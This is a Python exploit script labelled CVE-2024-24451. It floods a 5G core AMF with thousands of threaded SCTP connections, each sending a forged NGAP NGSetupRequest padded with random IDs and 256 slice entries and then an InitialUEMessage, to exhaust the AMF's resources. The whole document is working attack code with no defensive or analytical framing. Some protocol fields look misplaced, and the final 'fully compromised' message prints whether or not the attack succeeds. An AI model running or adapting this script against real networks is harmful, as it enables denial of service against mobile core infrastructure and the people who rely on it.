# =============================================================================
# CVE-2024-24451 - 3GPP-Aligned AMF Exploit (Optimized)
# =============================================================================

import socket
import sctp
import random
import time
import threading
import os
import resource
from pycrate_asn1dir import NGAP  # TS 38.413 ASN.1 via pycrate

# =============================================================================
# 3GPP TS 38.413 / TS 38.414 Configuration
# =============================================================================
AMF_IP = "192.168.1.100"
NGAP_PORT = 38412
MAX_CONNECTIONS = 2048  # File descriptor exhaustion
GNB_ID_BITS = 32        # Exhaustion attack
SLICES_PER_TA = 256     # Slice contention

# =============================================================================
# Exploit Class
# =============================================================================
class AMF_Exploit:
    def __init__(self):
        self.connections = []
        self.ue_id_counter = 1
        self.lock = threading.Lock()

    def build_ngap_attack(self):
        """ Constructs multi-vector NGAP attack payload """
        msg = NGAP.NGAP_PDU_Descriptions.NGSetupRequest()

        msg['protocolIEs']['GlobalRANNodeID'] = {
            'globalGNB-ID': {
                'plmnID': os.urandom(3),
                'gNB-ID': {'gNB-ID': (os.urandom(4), GNB_ID_BITS)}
            }
        }

        msg['protocolIEs']['SupportedTAList'] = [{
            'tAC': os.urandom(4),
            'broadcastPLMNList': [{
                'pLMNIdentity': os.urandom(3),
                'tAISliceSupportList': [
                    {'sST': (0xff,), 'sD': os.urandom(3)} for _ in range(SLICES_PER_TA)
                ]
            }]
        }]

        msg['protocolIEs']['AMF-UE-NGAP-ID'] = self.ue_id_counter % 0xffffffff

        return msg.to_aper()

    def create_attack_session(self):
        """ Creates a persistent SCTP connection and injects malicious NGAP messages """
        try:
            sock = sctp.sctpsocket_tcp(socket.AF_INET)
            sock.bind(('0.0.0.0', 0))
            sock.connect((AMF_IP, NGAP_PORT))
            sock.sctp_send(self.build_ngap_attack(), ppid=60)

            ue_msg = NGAP.NGAP_PDU_Descriptions.InitialUEMessage()
            ue_msg.set_val({
                'protocolIEs': {
                    'AMF-UE-NGAP-ID': self.ue_id_counter,
                    'RAN-UE-NGAP-ID': self.ue_id_counter,
                    'UserLocationInformation': {
                        'userLocationInformationNR': {
                            'nR-CGI': {
                                'pLMNIdentity': os.urandom(3),
                                'nRCellIdentity': (os.urandom(5), 36)
                            },
                            'tAI': {
                                'pLMNIdentity': os.urandom(3),
                                'tAC': os.urandom(4)
                            }
                        }
                    }
                }
            })
            sock.sctp_send(ue_msg.to_aper(), ppid=60)

            with self.lock:
                self.connections.append(sock)
                self.ue_id_counter += 1

            while True:
                threading.Event().wait(random.uniform(0.05, 0.2))

        except Exception as e:
            pass

    def execute(self):
        """ Manages attack execution """
        resource.setrlimit(resource.RLIMIT_NOFILE, (MAX_CONNECTIONS * 2, MAX_CONNECTIONS * 2))

        for i in range(0, MAX_CONNECTIONS, 100):
            for _ in range(100):
                threading.Thread(target=self.create_attack_session, daemon=True).start()
            print(f"[*] {i + 100} connections launched...")
            time.sleep(0.5)

        print("\n[+] AMF resources fully compromised!")

if __name__ == "__main__":
    print("=== CVE-2024-24451 AMF Exploit (Optimized) ===")
    AMF_Exploit().execute()
